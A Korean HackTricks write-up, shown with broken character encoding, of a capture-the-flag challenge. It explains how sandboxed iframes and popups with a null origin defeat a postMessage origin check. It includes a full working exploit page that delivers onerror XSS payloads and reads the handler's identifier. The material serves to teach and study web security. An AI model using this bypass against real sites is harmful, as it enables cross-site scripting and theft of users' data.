# SOP ìš°íšŒí•˜ê¸° - Iframes - 1

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ ì €ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ [hacktricks repo](https://github.com/carlospolop/hacktricks) ë° [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## SOP-1ì—ì„œì˜ Iframes

[**NDevTK**](https://github.com/NDevTK)ì™€ [**Terjanq**](https://github.com/terjanq)ê°€ ë§Œë“  ì´ [**ë„ì „ê³¼ì œ**](https://github.com/terjanq/same-origin-xss)ì—ì„œëŠ” ì½”ë“œ ë‚´ XSSë¥¼ ì•…ìš©í•´ì•¼ í•©ë‹ˆë‹¤.
```javascript
const identifier = '4a600cd2d4f9aa1cfb5aa786';
onmessage = e => {
const data = e.data;
if (e.origin !== window.origin && data.identifier !== identifier) return;
if (data.type === 'render') {
renderContainer.innerHTML = data.body;
}
}
```
ì£¼ìš” ë¬¸ì œëŠ” [**ë©”ì¸ í˜ì´ì§€**](https://so-xss.terjanq.me)ê°€ DomPurifyë¥¼ ì‚¬ìš©í•˜ì—¬ `data.body`ë¥¼ ì „ì†¡í•˜ê¸° ë•Œë¬¸ì— í•´ë‹¹ ì½”ë“œë¡œ ìì²´ HTML ë°ì´í„°ë¥¼ ë³´ë‚´ë ¤ë©´ `e.origin !== window.origin`ì„ **ìš°íšŒ**í•´ì•¼ í•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤.

ì œì•ˆëœ í•´ê²°ì±…ì„ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤.

### SOP ìš°íšŒ 1 (e.origin === null)

`//example.org`ì´ **sandboxed iframe**ì— í¬í•¨ë˜ë©´ í˜ì´ì§€ì˜ **ì›ë³¸(origin)**ì€ **`null`**ì´ ë©ë‹ˆë‹¤. ì¦‰, **`window.origin === null`**ì…ë‹ˆë‹¤. ë”°ë¼ì„œ `<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">`ë¥¼ í†µí•´ iframeì„ í¬í•¨ì‹œí‚¤ë©´ **`null` ì›ë³¸**ì„ ê°•ì œë¡œ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

í˜ì´ì§€ê°€ **í¬í•¨ ê°€ëŠ¥**í•œ ê²½ìš°ì—ëŠ” ì´ëŸ¬í•œ ë³´í˜¸ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì¿ í‚¤ë„ `SameSite=None`ìœ¼ë¡œ ì„¤ì •í•´ì•¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤).

### SOP ìš°íšŒ 2 (window.origin === null)

ì˜ ì•Œë ¤ì§€ì§€ ì•Šì€ ì‚¬ì‹¤ì€ **sandbox ê°’ìœ¼ë¡œ `allow-popups`ê°€ ì„¤ì •**ë˜ì–´ ìˆì„ ë•Œ **ì—´ë¦° íŒì—…**ì€ `allow-popups-to-escape-sandbox`ê°€ ì„¤ì •ë˜ì§€ ì•ŠëŠ” í•œ ëª¨ë“  **sandboxed ì†ì„±**ì„ **ìƒì†**ë°›ëŠ”ë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤.\
ë”°ë¼ì„œ **null ì›ë³¸**ì—ì„œ **íŒì—…ì„ ì—´ë©´** íŒì—… ë‚´ë¶€ì˜ **`window.origin`**ë„ **`null`**ì´ ë©ë‹ˆë‹¤.

### ë„ì „ ê³¼ì œ í•´ê²°ì±…

ë”°ë¼ì„œ ì´ ë„ì „ ê³¼ì œì—ì„œëŠ” **iframeì„ ìƒì„±**í•˜ê³ , ì·¨ì•½í•œ XSS ì½”ë“œ í•¸ë“¤ëŸ¬ì¸ (`/iframe.php`) í˜ì´ì§€ë¡œ **íŒì—…ì„ ì—´ ìˆ˜** ìˆìŠµë‹ˆë‹¤. `window.origin === e.origin`ì´ ê°€ëŠ¥í•œ ì´ìœ ëŠ” ë‘˜ ë‹¤ `null`ì´ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ XSSë¥¼ ì•…ìš©í•  í˜ì´ë¡œë“œë¥¼ **ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

í•´ë‹¹ í˜ì´ë¡œë“œëŠ” **ì‹ë³„ì**ë¥¼ ê°€ì ¸ì™€ **XSSë¥¼ ë‹¤ì‹œ ìƒìœ„ í˜ì´ì§€** (íŒì—…ì„ ì—´ì—ˆë˜ í˜ì´ì§€)ë¡œ **ì „ì†¡**í•©ë‹ˆë‹¤. ì´ë•Œ, ì‹ë³„ìëŠ” ì•Œë ¤ì ¸ ìˆìœ¼ë¯€ë¡œ `window.origin === e.origin` ì¡°ê±´ì´ ë§Œì¡±ë˜ì§€ ì•Šì•„ë„ ìƒê´€ì—†ìŠµë‹ˆë‹¤ (ê¸°ì–µí•˜ì„¸ìš”, ì›ë³¸ì€ **iframeì˜ íŒì—…**ì´ë©° **ì›ë³¸**ì€ **`null`**ì…ë‹ˆë‹¤) `data.identifier === identifier`ì…ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, XSSê°€ ë‹¤ì‹œ íŠ¸ë¦¬ê±°ë©ë‹ˆë‹¤. ì´ë²ˆì—ëŠ” ì˜¬ë°”ë¥¸ ì›ë³¸ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤.
```html
<body>
<script>
f = document.createElement('iframe');

// Needed flags
f.sandbox = 'allow-scripts allow-popups allow-top-navigation';

// Second communication with /iframe.php (this is the top page relocated)
// This will execute the alert in the correct origin
const payload = `x=opener.top;opener.postMessage(1,'*');setTimeout(()=>{
x.postMessage({type:'render',identifier,body:'<img/src/onerror=alert(localStorage.html)>'},'*');
},1000);`.replaceAll('\n',' ');

// Initial communication
// Open /iframe.php in a popup, both iframes and popup will have "null" as origin
// Then, bypass window.origin === e.origin to steal the identifier and communicate
// with the top with the second XSS payload
f.srcdoc = `
<h1>Click me!</h1>
<script>
onclick = e => {
let w = open('https://so-xss.terjanq.me/iframe.php');
onmessage = e => top.location = 'https://so-xss.terjanq.me/iframe.php';
setTimeout(_ => {
w.postMessage({type: "render", body: "<audio/src/onerror=\\"${payload}\\">"}, '*')
}, 1000);
};
<\/script>
`
document.body.appendChild(f);
</script>
</body>
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”**? ì•„ë‹ˆë©´ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”. ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ ì €ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ [hacktricks repo](https://github.com/carlospolop/hacktricks) ë° [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>
